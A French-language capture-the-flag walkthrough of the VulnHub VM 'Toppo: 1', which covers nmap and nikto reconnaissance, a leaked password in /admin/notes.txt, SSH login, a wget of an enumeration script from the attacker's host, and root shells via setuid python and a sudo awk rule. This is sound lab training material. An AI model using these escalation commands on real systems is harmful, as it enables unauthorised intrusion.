# Toppo: 1

[Toppo: 1](https://www.vulnhub.com/entry/toppo-1,245/) est une machine virtuelle vulnérable conçue par [Hadi Mene](https://twitter.com/@h4d3sw0rm). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...

## TED Talks too much

L'adresse IP de la VM Toppo nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.104.

Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH au serveur Toppo, sur le port 22 ; un serveur Web Apache 2.4.25 est par ailleurs installé et en écoute sur le port 80, il semble héberger un blog. 

```console
root@blinils:~/CTF# nmap -sT -sV -p- -A 192.168.56.104
--snip--
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38847/tcp  status
|_  100024  1          44180/udp  status
38847/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:9C:F3:5A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 192.168.56.104
```

Quatre articles de blog, un formulaire de contact, et rien de plus à se mettre sous la dent.

Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [nikto](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.

```console
root@blinils:~/CTF# nikto -h 192.168.56.104
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        80
+ Start Time:         2018-07-07 07:07:00 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2018-07-07 07:07:07 (GMT-4) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Le [_Directory Listing_](https://www.it-connect.fr/quest-ce-que-le-directory-browsinglisting/) est activé sur le serveur, et ça tombe bien, le répertoire /admin/ contient un unique fichier notes.txt.

```console
root@blinils:~/CTF# curl http://192.168.56.104/admin/notes.txt
Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```

À défaut d'avoir trouvé une mire d'authentification sur le blog, j'ai tenté de me connecter en SSH... oui mais avec quel utilisateur ? Après de (très) nombreux essais infructueux avec différentes listes [(1)](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) [(2)](https://github.com/insidetrust/statistically-likely-usernames) [(3)](https://github.com/jeanphorn/wordlist) glanées sur Github, j'ai tenté ted. Juste ted, comme dans le mot de passe... et ça a marché. Damn!

```console
root@blinils:~/CTF# ssh ted@192.168.56.104
ted@192.168.56.104's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$ uname -a
Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted@Toppo:~$
```

## Un petit Toppo sur la situation

Le script [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.

```console
ted@Toppo:~$ wget -q http://192.168.56.102:8000/linuxprivchecker.py

ted@Toppo:~$ ls
linuxprivchecker.py

ted@Toppo:~$ python linuxprivchecker.py
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

--snip--

[+] Sudoers (privileged)
    ted ALL=(ALL) NOPASSWD: /usr/bin/awk

--snip--

[+] Current User
    root

[+] Current User ID
    uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)

[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?

[+] Checking if root's home folder is accessible
    /root:
    total 24K
    drwx------  2 root root 4.0K Apr 15 11:40 .
    drwxr-xr-x 21 root root 4.0K Apr 15 10:02 ..
    -rw-------  1 root root   53 Apr 15 12:28 .bash_history
    -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
    -rw-r--r--  1 root root  140 Nov 19  2007 .profile
    -rw-r--r--  1 root root  397 Apr 15 10:19 flag.txt
	
--snip--
```

WHAT! La valeur de mon [euid](http://www.linux-france.org/article/dalox/unix03.htm) est 0, et je peux lire le contenu du répertoire /root. Par quel miracle ?

```console
--snip--

[+] SUID/SGID Files and Directories
    drwxr-sr-x 3 root systemd-journal 60 Jul 12 11:52 /run/log/journal
    drwxr-s--- 2 root systemd-journal 60 Jul 12 11:52 /run/log/journal/255354b061a24857a8a597fb3ef2d05e
    --snip--
    drwxrwsr-x 4 root staff 4096 Apr 15 10:07 /usr/local/lib/python2.7
    drwxrwsr-x 2 root staff 4096 Apr 15 10:06 /usr/local/lib/python2.7/dist-packages
    drwxrwsr-x 2 root staff 4096 Apr 15 10:07 /usr/local/lib/python2.7/site-packages
    --snip--
    -rwsrwxrwx 1 root root 3889608 Aug 13  2016 /usr/bin/python2.7
	
--snip--
```

Waouh ! Grâce au (ou plutôt à cause du) [setuid](https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/) positionné sur le binaire python, qui appartient à root. En résumé, lorsque l'utilisateur ted (ou un autre utilisateur) exécute une commande python, celle-ci est lancée avec les droits root. À nous les droits root et le fichier flag.txt ! Plusieurs possibilités s'offrent alors à nous.

## Monsieur et Madame evenuroot ont un fils

```console
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)

ted@Toppo:~$ python -c 'import pty; pty.spawn("/bin/sh")'

# id
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
```

Il est également possible de se servir de l'information fournie par le fichier /etc/sudoers.

```console
ted@Toppo:~$ ls -al /usr/bin/awk
lrwxrwxrwx 1 root root 21 Apr 15 10:01 /usr/bin/awk -> /etc/alternatives/awk

ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)

ted@Toppo:~$ awk 'BEGIN {system("/bin/sh")}'

# id
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
```

Une petite ligne de Python pour définitivement passer root et nous y sommes !

```console
# python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh");'

# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth),1000(ted)

# wc -c /root/flag.txt
397 /root/flag.txt
```

En bonus, la version rapide... et en parallèle, John The Ripper a trouvé les 7 lettres du mot de passe de root en 7 secondes.

```console
ted@Toppo:~$ python -c "f=open('/root/flag.txt','r');print f.read();f.close();"

[REDACTED]
```

Voilà qui conclut ce walkthrough, merci à Hadi Mene sur sa VM boot2root Toppo: 1 !
